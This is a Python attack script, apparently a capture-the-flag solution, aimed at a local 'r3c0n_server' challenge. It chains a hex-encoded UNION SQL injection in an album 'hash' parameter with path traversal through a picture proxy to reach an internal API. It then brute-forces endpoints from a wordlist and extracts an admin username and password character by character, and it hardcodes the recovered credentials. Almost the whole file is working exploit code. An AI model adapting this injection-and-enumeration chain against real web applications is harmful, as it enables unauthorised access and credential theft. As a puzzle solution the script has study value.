import requests, re
import time


d = open("/Users/amansapra/Desktop/hacking/wordlist/apiendpoints.txt", "r")
printables = """abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$&\'()*+,-./:;<=>?@[\\]^`{|}~_ '%"""


def find(directory):
	# start = time.time()


	unhex = ("1' union select 1,2,'../api/"+directory.strip()+"'#").encode("hex")
	url = """http://127.0.0.1:8090/r3c0n_server_4fdk59/album?hash=-1'+union+all+select+unhex("{}"),"x","x"--+-""".format(unhex)
	r = requests.get(url).text

	val = re.search("data=(.*cL3VwbG9hZHNcLy.*)\"", r).group(1)

	x  = requests.get("http://127.0.0.1:8090/r3c0n_server_4fdk59/picture?data="+val)

	if "Received: 404" not in x.text:
		print(x.text, directory)

	# print("Time", time.time() - start)


	return


def findusername(user):
	# start = time.time()


	unhex = ("1' union select 1,2,'../api/user/?username="+user.strip()+"%").encode("hex")
	url = """http://127.0.0.1:8090/r3c0n_server_4fdk59/album?hash=-1'+union+all+select+unhex("{}"),"x","x"--+-""".format(unhex)
	r = requests.get(url).text

	val = re.search("data=(.*cL3VwbG9hZHNcLy.*)\"", r).group(1)

	x  = requests.get("http://127.0.0.1:8090/r3c0n_server_4fdk59/picture?data="+val)


	if "Received: 204" not in x.text:
		return True
	else :
		return False

	# print("Time", time.time() - start)


	return


def findpassword(username, password):
	# start = time.time()


	unhex = ("1' union select 1,2,'../api/user/?username="+username+"&password="+password.strip()+"%").encode("hex")
	url = """http://127.0.0.1:8090/r3c0n_server_4fdk59/album?hash=-1'+union+all+select+unhex("{}"),"x","x"--+-""".format(unhex)
	r = requests.get(url).text

	val = re.search("data=(.*cL3VwbG9hZHNcLy.*)\"", r).group(1)

	x  = requests.get("http://127.0.0.1:8090/r3c0n_server_4fdk59/picture?data="+val)


	if "Received: 204" not in x.text:
		return True
	else :
		return False

	# print("Time", time.time() - start)


	return



from threading import Thread
import Queue 
import time

class TaskQueue(Queue.Queue):

    def __init__(self, num_workers=1):
        Queue.Queue.__init__(self)
        self.num_workers = num_workers
        self.start_workers()

    def add_task(self, task, *args, **kwargs):
        args = args or ()
        kwargs = kwargs or {}
        self.put((task, args, kwargs))

    def start_workers(self):
        for i in range(self.num_workers):
            t = Thread(target=self.worker)
            t.daemon = True
            t.start()

    def worker(self):
        while True:
            tupl = self.get()
            item, args, kwargs = self.get()
            item(*args, **kwargs)  
            self.task_done()



q = TaskQueue(num_workers=20)

# for val in d:
# 	q.add_task(find, val)
# q.join()

# # api/ping
# # api/user



find("user/?usernam=")

username = "grinchadmin"
# while 1:
# 	for i in printables:
# 		print( "Trying ", username + i)
# 		f = findusername(username + i)
# 		if f == True:
# 			print("Found", username + i)
# 			username = username + i
# 			break


password = "s4nt4sucks"
# while 1:
# 	for i in printables:
# 		print( "Trying ", password + i)
# 		f = findpassword(username, password + i)
# 		if f == True:
# 			print("Found", password + i)
# 			password = password + i
# 			break













